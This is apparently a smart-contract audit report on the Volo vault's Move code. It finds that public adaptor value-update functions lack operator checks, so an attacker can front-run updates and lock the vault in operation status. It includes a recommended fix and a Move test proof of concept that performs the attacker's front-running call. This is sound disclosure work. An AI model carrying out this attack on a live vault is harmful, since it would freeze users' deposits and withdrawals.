# Audit Report

## Title
Missing Access Control in Adaptor Value Update Functions Allows Permanent Vault DoS via Front-Running

## Summary
All adaptor value update functions lack operator capability checks and can be called by anyone during vault operations. An attacker can front-run the operator's legitimate value updates to insert duplicate entries into the operation tracking table, causing all subsequent operator updates to abort and permanently locking the vault in operation status with no admin recovery path.

## Finding Description

The vulnerability exists because all adaptor value update functions are declared as `public fun` without any access control checks: [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) 

Since both Vault and OracleConfig are shared objects, these functions can be called by any external account: [6](#0-5) [7](#0-6) 

These adaptor functions call `finish_update_asset_value`, which during vault operations attempts to add the asset type to the `asset_types_updated` table using `Table::add()`: [8](#0-7) 

The critical flaw is that `finish_update_asset_value` only validates `assert_enabled()`, which permits calls during `VAULT_DURING_OPERATION_STATUS`: [9](#0-8) 

**Attack Flow:**

1. Operator calls `start_op_with_bag`, transitioning vault to operation status and recording borrowed assets: [10](#0-9) 

2. Operator calls `end_op_with_bag`, which enables value updates: [11](#0-10) [12](#0-11) 

3. **Attack Window**: Attacker monitors `OperationEnded` events and front-runs the operator's value update transaction by calling adaptor functions with higher gas, causing entries to be added to `asset_types_updated` table at line 1194.

4. Operator's legitimate update calls abort because `Table::add()` fails on duplicate keys.

5. Vault becomes stuck because `check_op_value_update_record` requires all borrowed assets to be marked as updated, but the operator cannot re-update due to duplicates: [13](#0-12) 

6. **No Recovery**: Admin cannot change vault status because `set_enabled` explicitly prevents status changes during operations: [14](#0-13) 

## Impact Explanation

**Critical Denial of Service:**

- Vault becomes permanently stuck in `VAULT_DURING_OPERATION_STATUS`
- All user deposits abort due to `assert_normal()` requirement: [15](#0-14) 

- All user withdrawals abort due to `assert_normal()` requirement: [16](#0-15) 

- No new operations can start because `pre_vault_check` requires normal status: [10](#0-9) 

- Protocol requires contract upgrade or redeployment to recover
- All vault users (potentially millions in TVL) lose access to their funds indefinitely

## Likelihood Explanation

**High Probability:**

- **Reachability**: Functions are `public fun` callable via Programmable Transaction Blocks with shared objects
- **Attack Complexity**: Low - attacker simply monitors on-chain events and front-runs with higher gas
- **Prerequisites**: Only requires vault to be in active operation (occurs regularly for yield optimization)
- **Attack Cost**: Minimal (only standard transaction gas fees)
- **No Authentication**: Zero access control on value update functions
- **Attack Window**: Exists between `end_op_with_bag` and operator's value update transactions

The attack is economically rational for griefing, competitor sabotage, or manipulation of external DeFi positions dependent on Volo vault availability.

## Recommendation

Add operator capability checks to all adaptor value update functions:

```move
public fun update_navi_position_value<PrincipalCoinType>(
    operation: &Operation,
    cap: &OperatorCap,
    vault: &mut Vault<PrincipalCoinType>,
    config: &OracleConfig,
    clock: &Clock,
    asset_type: String,
    storage: &mut Storage,
) {
    vault::assert_operator_not_freezed(operation, cap);
    // ... rest of function
}
```

Apply this pattern to all adaptor update functions. Alternatively, add operator capability check inside `finish_update_asset_value` when `value_update_enabled` is true.

## Proof of Concept

```move
#[test]
#[expected_failure(abort_code = sui::dynamic_field::EFieldAlreadyExists)]
public fun test_front_run_value_update_dos() {
    let mut scenario = test_scenario::begin(OWNER);
    let mut clock = clock::create_for_testing(scenario.ctx());
    
    // Setup vault with Navi position
    init_vault::init_vault(&mut scenario, &mut clock);
    init_vault::init_create_vault<SUI_TEST_COIN>(&mut scenario);
    
    scenario.next_tx(OWNER);
    {
        let mut vault = scenario.take_shared<Vault<SUI_TEST_COIN>>();
        let navi_cap = lending::create_account(scenario.ctx());
        vault.add_new_defi_asset(0, navi_cap);
        test_scenario::return_shared(vault);
    };
    
    // Operator starts operation
    scenario.next_tx(OPERATOR);
    {
        let operation = scenario.take_shared<Operation>();
        let mut vault = scenario.take_shared<Vault<SUI_TEST_COIN>>();
        let op_cap = scenario.take_from_sender<OperatorCap>();
        
        let (bag, tx, tx_check, bal, coin_bal) = operation::start_op_with_bag(
            &mut vault, &operation, &op_cap, &clock,
            vector[0], vector[type_name::get<NaviAccountCap>()],
            0, 0, scenario.ctx()
        );
        
        operation::end_op_with_bag(&mut vault, &operation, &op_cap, bag, tx, bal, coin_bal);
        
        scenario.return_to_sender(op_cap);
        test_scenario::return_shared(vault);
        test_scenario::return_shared(operation);
    };
    
    // ATTACKER front-runs operator's value update
    scenario.next_tx(ATTACKER);
    {
        let mut vault = scenario.take_shared<Vault<SUI_TEST_COIN>>();
        let config = scenario.take_shared<OracleConfig>();
        let mut storage = scenario.take_shared<Storage>();
        
        let asset_type = vault_utils::parse_key<NaviAccountCap>(0);
        // Attacker calls public function - no access control!
        navi_adaptor::update_navi_position_value(
            &mut vault, &config, &clock, asset_type, &mut storage
        );
        
        test_scenario::return_shared(vault);
        test_scenario::return_shared(config);
        test_scenario::return_shared(storage);
    };
    
    // Operator's legitimate call ABORTS with duplicate key
    scenario.next_tx(OPERATOR);
    {
        let mut vault = scenario.take_shared<Vault<SUI_TEST_COIN>>();
        let config = scenario.take_shared<OracleConfig>();
        let mut storage = scenario.take_shared<Storage>();
        
        let asset_type = vault_utils::parse_key<NaviAccountCap>(0);
        // This ABORTS - vault now permanently stuck!
        navi_adaptor::update_navi_position_value(
            &mut vault, &config, &clock, asset_type, &mut storage
        );
        
        test_scenario::return_shared(vault);
        test_scenario::return_shared(config);
        test_scenario::return_shared(storage);
    };
    
    clock.destroy_for_testing();
    scenario.end();
}
```

### Citations

**File:** volo-vault/sources/adaptors/navi_adaptor.move (L13-29)
```text
public fun update_navi_position_value<PrincipalCoinType>(
    vault: &mut Vault<PrincipalCoinType>,
    config: &OracleConfig,
    clock: &Clock,
    asset_type: String,
    storage: &mut Storage,
) {
    let account_cap = vault.get_defi_asset<PrincipalCoinType, NaviAccountCap>(asset_type);
    let usd_value = calculate_navi_position_value(
        account_cap.account_owner(),
        storage,
        config,
        clock,
    );

    vault.finish_update_asset_value(asset_type, usd_value, clock.timestamp_ms());
}
```

**File:** volo-vault/sources/adaptors/cetus_adaptor.move (L19-30)
```text
public fun update_cetus_position_value<PrincipalCoinType, CoinA, CoinB>(
    vault: &mut Vault<PrincipalCoinType>,
    config: &OracleConfig,
    clock: &Clock,
    asset_type: String,
    pool: &mut CetusPool<CoinA, CoinB>,
) {
    let cetus_position = vault.get_defi_asset<PrincipalCoinType, CetusPosition>(asset_type);
    let usd_value = calculate_cetus_position_value(pool, cetus_position, config, clock);

    vault.finish_update_asset_value(asset_type, usd_value, clock.timestamp_ms());
}
```

**File:** volo-vault/sources/adaptors/suilend_adaptor.move (L23-40)
```text
public fun update_suilend_position_value<PrincipalCoinType, ObligationType>(
    vault: &mut Vault<PrincipalCoinType>,
    lending_market: &mut LendingMarket<ObligationType>,
    clock: &Clock,
    asset_type: String,
) {
    let obligation_cap = vault.get_defi_asset<
        PrincipalCoinType,
        SuilendObligationOwnerCap<ObligationType>,
    >(
        asset_type,
    );

    suilend_compound_interest(obligation_cap, lending_market, clock);
    let usd_value = parse_suilend_obligation(obligation_cap, lending_market, clock);

    vault.finish_update_asset_value(asset_type, usd_value, clock.timestamp_ms());
}
```

**File:** volo-vault/sources/adaptors/momentum.adaptor.move (L21-32)
```text
public fun update_momentum_position_value<PrincipalCoinType, CoinA, CoinB>(
    vault: &mut Vault<PrincipalCoinType>,
    config: &OracleConfig,
    clock: &Clock,
    asset_type: String,
    pool: &mut MomentumPool<CoinA, CoinB>,
) {
    let position = vault.get_defi_asset<PrincipalCoinType, MomentumPosition>(asset_type);
    let usd_value = get_position_value(pool, position, config, clock);

    vault.finish_update_asset_value(asset_type, usd_value, clock.timestamp_ms());
}
```

**File:** volo-vault/sources/adaptors/receipt_adaptor.move (L16-36)
```text
public fun update_receipt_value<PrincipalCoinType, PrincipalCoinTypeB>(
    vault: &mut Vault<PrincipalCoinType>,
    receipt_vault: &Vault<PrincipalCoinTypeB>,
    config: &OracleConfig,
    clock: &Clock,
    asset_type: String,
) {
    // Actually it seems no need to check this
    // "vault" and "receipt_vault" can not be passed in with the same vault object
    // assert!(
    //     type_name::get<PrincipalCoinType>() != type_name::get<PrincipalCoinTypeB>(),
    //     ERR_NO_SELF_VAULT,
    // );
    receipt_vault.assert_normal();

    let receipt = vault.get_defi_asset<PrincipalCoinType, Receipt>(asset_type);

    let usd_value = get_receipt_value(receipt_vault, config, receipt, clock);

    vault.finish_update_asset_value(asset_type, usd_value, clock.timestamp_ms());
}
```

**File:** volo-vault/sources/volo_vault.move (L456-456)
```text
    transfer::share_object(vault);
```

**File:** volo-vault/sources/volo_vault.move (L518-531)
```text
public(package) fun set_enabled<PrincipalCoinType>(
    self: &mut Vault<PrincipalCoinType>,
    enabled: bool,
) {
    self.check_version();
    assert!(self.status() != VAULT_DURING_OPERATION_STATUS, ERR_VAULT_DURING_OPERATION);

    if (enabled) {
        self.set_status(VAULT_NORMAL_STATUS);
    } else {
        self.set_status(VAULT_DISABLED_STATUS);
    };
    emit(VaultEnabled { vault_id: self.vault_id(), enabled: enabled })
}
```

**File:** volo-vault/sources/volo_vault.move (L645-647)
```text
public(package) fun assert_enabled<PrincipalCoinType>(self: &Vault<PrincipalCoinType>) {
    assert!(self.status() != VAULT_DISABLED_STATUS, ERR_VAULT_NOT_ENABLED);
}
```

**File:** volo-vault/sources/volo_vault.move (L707-717)
```text
public(package) fun request_deposit<PrincipalCoinType>(
    self: &mut Vault<PrincipalCoinType>,
    coin: Coin<PrincipalCoinType>,
    clock: &Clock,
    expected_shares: u256,
    receipt_id: address,
    recipient: address,
): u64 {
    self.check_version();
    self.assert_normal();
    assert!(self.contains_vault_receipt_info(receipt_id), ERR_RECEIPT_NOT_FOUND);
```

**File:** volo-vault/sources/volo_vault.move (L896-906)
```text
public(package) fun request_withdraw<PrincipalCoinType>(
    self: &mut Vault<PrincipalCoinType>,
    clock: &Clock,
    receipt_id: address,
    shares: u256,
    expected_amount: u64,
    recipient: address,
): u64 {
    self.check_version();
    self.assert_normal();
    assert!(self.contains_vault_receipt_info(receipt_id), ERR_RECEIPT_NOT_FOUND);
```

**File:** volo-vault/sources/volo_vault.move (L1174-1203)
```text
public(package) fun finish_update_asset_value<PrincipalCoinType>(
    self: &mut Vault<PrincipalCoinType>,
    asset_type: String,
    usd_value: u256,
    now: u64,
) {
    self.check_version();
    self.assert_enabled();

    let last_update_time = &mut self.assets_value_updated[asset_type];
    *last_update_time = now;

    let position_value = &mut self.assets_value[asset_type];
    *position_value = usd_value;

    if (
        self.status() == VAULT_DURING_OPERATION_STATUS 
        && self.op_value_update_record.value_update_enabled 
        && self.op_value_update_record.asset_types_borrowed.contains(&asset_type)
    ) {
        self.op_value_update_record.asset_types_updated.add(asset_type, true);
    };

    emit(AssetValueUpdated {
        vault_id: self.vault_id(),
        asset_type: asset_type,
        usd_value: usd_value,
        timestamp: now,
    });
}
```

**File:** volo-vault/sources/volo_vault.move (L1206-1219)
```text
public(package) fun check_op_value_update_record<PrincipalCoinType>(
    self: &Vault<PrincipalCoinType>,
) {
    self.check_version();
    self.assert_enabled();
    assert!(self.op_value_update_record.value_update_enabled, ERR_OP_VALUE_UPDATE_NOT_ENABLED);

    let record = &self.op_value_update_record;

    record.asset_types_borrowed.do_ref!(|asset_type| {
        assert!(record.asset_types_updated.contains(*asset_type), ERR_USD_VALUE_NOT_UPDATED);
        assert!(*record.asset_types_updated.borrow(*asset_type), ERR_USD_VALUE_NOT_UPDATED);
    });
}
```

**File:** volo-vault/sources/volo_vault.move (L1242-1247)
```text
public(package) fun enable_op_value_update<PrincipalCoinType>(self: &mut Vault<PrincipalCoinType>) {
    self.check_version();
    self.assert_enabled();

    self.op_value_update_record.value_update_enabled = true;
}
```

**File:** volo-vault/sources/oracle.move (L93-93)
```text
    transfer::share_object(config);
```

**File:** volo-vault/sources/operation.move (L68-76)
```text
public(package) fun pre_vault_check<PrincipalCoinType>(
    vault: &mut Vault<PrincipalCoinType>,
    ctx: &TxContext,
) {
    // vault.assert_enabled();
    vault.assert_normal();
    vault.set_status(VAULT_DURING_OPERATION_STATUS);
    vault.try_reset_tolerance(false, ctx);
}
```

**File:** volo-vault/sources/operation.move (L294-294)
```text
    vault.enable_op_value_update();
```
